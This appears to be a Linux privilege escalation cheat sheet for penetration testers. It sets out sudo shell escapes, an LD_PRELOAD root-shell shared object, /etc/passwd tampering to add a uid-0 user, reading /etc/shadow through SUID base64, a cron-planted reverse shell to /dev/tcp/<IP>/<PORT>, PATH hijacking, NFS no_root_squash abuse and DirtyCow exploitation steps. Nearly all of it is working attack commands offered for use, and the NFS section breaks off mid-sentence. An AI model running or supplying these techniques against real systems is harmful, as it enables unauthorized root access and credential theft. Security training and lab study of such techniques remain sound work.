# Linux Privesc

1. Sudoers method
2. LD_PRELOAD method
3. Writable files method
4. SUID files method
5. Capabilities method
6. Crontab method
7. PATH method
8. NFS method
9. Kernel Exploit

1. Dirty cow

``` ```
## Sudoers method

#### Exhaustive list of privilege escalation using Sudoers
```
https://gtfobins.github.io/
```

##### ➤ Check its current situation related to root privileges
```
kiosec@lab:/home$ sudo -l
```

##### ➤ Python
```
sudo -u root /usr/bin/python
>>> from subprocess import call
>>> call(['/bin/bash'])
```

##### ➤ Perl
```
sudo -u root /usr/bin/perl -e ‘`/bin/bash`’
```

##### ➤ CP + Chmod
```
sudo -u root /bin/cp exploit exploit
sudo -u root /bin/chmod +xs exploit
./exploit
```

##### ➤ Awk
```
awk 'BEGIN {system("/bin/bash")}'
```

##### ➤ Less
```
• Solution 1 - read a file
sudo -u root /usr/bin/less /etc/shadow
 
• Solution 2 - create a file
sudo -u root /usr/bin/less 
then insert the following command :
!/bin/bash
```

##### ➤ Vim
```
sudo -u victim /usr/bin/vim
then write the following command (same way to quit vim :!q):
:!/bin/bash
```

##### ➤ Find
```
sudo -u root /usr/bin/find /bin -name "bash" -exec {} \;
```

##### ➤ Bash
```
sudo -u root /bin/bash
```

##### ➤ Nmap
```
sudo -u nmap –interactive
nmap>!bash
or
nmap>!sh
```

##### ➤ Mail
```
sudo mail --exec='!/bin/bash'
```


``` ```
``` ```
## LD_PRELOAD method
https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/


##### ➤ Check for LD_PRELOAD (with the env_keep option)
```
kiosec@lab:/home$ sudo -l
Matching Default entries for user on this host:
	en_reset, env_keep+=LD_PRELOAD
<snip>
```

##### ➤ Write a simple C code compiled as a share object (.so extension) file
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

##### ➤ Compile the code
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

##### ➤ Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```


``` ```
``` ```
## Writable files method

##### ➤ Read/write sensitive files
```
/etc/passwd
/etc/group
/etc/profile
/etc/shadow
```

##### ➤ Detect if the file is writable
```
ls -l /etc/passwd
-rwxrwxrwx. 1 root root 1306 Jan 10 21:30 /etc/passwd
```

##### ➤ Privesc 01 : Delete the x of the root user in /etc/password
```
• By deleting the 'x', all users can substitute the root user. 
root:x:0:0:root:/root:/bin/bash
->
root::0:0:root:/root:/bin/bash
```

##### ➤  Privesc 02 : Add another root user in /etc/password
```
echo "lexis:x:0:0:test:/root:/bin/bash" >> /etc/passwd
```


``` ```
``` ```
## SUID files method

##### ➤ List files that have SUID (Set-user Identification) or SGID (Set-group Identification) bits set. These (S) allow files to be executed with the permission level of the file owner or the group owner, respectively.
```
• find / -type f -perm -04000 -ls 2>/dev/null
OR more valuable
• find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null 
```

##### ➤ A good practice would be to compare executables on this list with GTFOBins
```
https://gtfobins.github.io/#+suid
```

##### Example
```
➤  Find SUID and SGID (base64 detected)

Kiosec@lab$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
<snip>
-rwsr-xr-x 1 root root 43352 Sep  5  2019 /usr/bin/base64
<snip>

➤  Verify that base64 is vulnerable to SUID attack
https://gtfobins.github.io/#+suid

➤  Follow the attack
• Method 01:
Kiosec@lab$cd /etc
Kiosec@lab/etc$ LFILE=shadow
Kiosec@lab/etc$ base64 "$LFILE" | base64 --decode
root:*:18561:0:99999:7:::
<snip>

• Method 02:
Kiosec@lab/etc$ base64 /etc/shadow | base64 --decode
root:*:18561:0:99999:7:::
<snip>

➤  Crack hashes using john
```

``` ```
``` ```
## Capabilities method

If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.


##### ➤ 1. Detect the Capabilities with CAP_SETUID (i.e. When run as an unprivileged user, getcap -r / will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null)
```
Kiosec@lab$getcap -r / 2>/dev/null
```

##### ➤ 2. Check if the binaries founded can be leveraged for privesc.
```
https://gtfobins.github.io/#
```


``` ```
``` ```
## Crontab method

##### ➤ 1. Check the cont job configurations stored as contabs  (cron tables)
```
kiosec@lab:/home$ cat /etc/crontab
```

###### Notes: Be careful with the PATH included at the beginning of the crontab file (first lines)

##### ➤ 2. Identify the cron job set by root

##### ➤ 3. For each of cron job identified, detect if the script can be modify (ex: script can be modify, can be remove or replace in the folder)
```
kiosec@lab:/home$ ls -al xxxx
```

##### ➤ 4. Modify the script with a reverse shell or a privilege escalation payloads

##### ➤ 4 BIS. Sometimes, the cron job is present in the crontab but the associated script does not exist. In this case, check if it is possible to write in the corresponding folder, then create a malicious script with the name. As example :
```
kiosec@lab:/home$ cat /etc/crontab
* * * * *  root /tmp/test.sh #Script located in tmp and run with root privileges
<snip>

kiosec@lab:/home$ ls -al
ls: cannot access '/tmp/test.sh': No such file or directory # The script does not exist
OR
kiosec@lab:/home$ locate test.py

kiosec@lab:/home$ echo "YOUR_PAYLOAD" >> /tmp/test.sh
OR
kiosec@lab:/home$ vim /tmp/test.sh
#!bin/bash
/bin/sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
OR directly
/bin/sh
```


``` ```
``` ```
## Path method

PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. 

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. 

##### ➤ Display the $PATH value
```
kiosec@lab:/home$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

##### Example of attack steps
```
➤ 1. Detect a script with SUID configuration
kiosec@lab:/home$ ls -al
<snip>
-rwsr-xr-x 1 root root 1023 March 21 10:03 vuln_script

➤ 2. Check the code source of the script and detect if a a system binary is called. As example : 
kiosec@lab:/home$ cat vuln_script
<snip>
system("random_binary");

➤ 3. By default, while you try to execute the script, Linux will start searching in the folder listed in $PATH. Consequently, check if the system binary called (ex: random_binary) is present in one of the folders listed in $PATH.
kiosec@lab:/$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v usr | sort -u
kiosec@lab:/$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u #Add “grep -v proc” to get rid of the many results related to running processes.

• 3.1 If the binary exists in one of the folders listed in $PATH, check if you can replace/modify it.

• 3.2 If the binary does not exist, check if you have the write permission on one of the folders listed in $PATH, then create the binary file 'random_binary' with your payload inside.

• 3.3 If the binary does not exist and you cannot write into the folders listed in $PATH, add a writable folder in the $PATH (as example tmp)
kiosec@lab:/home$ export PATH=/tmp:$PATH
Then, create the binary file 'random_binary' with your payloard inside.
kiosec@lab:/$ cd /tmp
kiosec@lab:/$ echo "/bin/bash" > random_binary
kiosec@lab:/$ chmod 777 random_binary

➤ 4. Execute the file with the SUID
./scriptSUID
```


``` ```
``` ```
## NFS method

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.


##### ➤ Display the NFS configuration
```
kiosec@lab:/home$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

The critical element for this privilege escalation vector is the **“no_root_squash”** option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. **If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.**

##### Example of attack steps
```
➤ 1. Detect the NFS with 'no_toot_squash'
<snip>
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)

➤ 2. Enumerate the mountable shares
kiosec@lab:/home$ showmount -e 10.0.0.1
Export list for 10.0.0.1
/backups          *
/mnt/sharedfolder *
/tmp              *

➤ 3. Mount one of the 
```


``` ```
``` ```
## DirtyCow exploit

Exploit: Linux Kernel 2.6.22 < 3.9

• https://dirtycow.ninja/
• https://github.com/FireFart/dirtycow/blob/master/dirty.c

##### Example of attack steps
```
➤ 1. Upload the exploit on the victim

➤ 2. Compile the exploit
gcc -pthread dirty.c -O dirty -lcrypt
chmod +x dirty

➤ 3. exploit it
./dirty
Please enter the new password: lexiswashere

➤ 4. Privesc
su firefart
Password: lexiswashere

Note: if the 'su : must be run from a terminal' error appear, upgrade tty 
python -c 'import pty; pty.spawn("/bin/sh")'
```
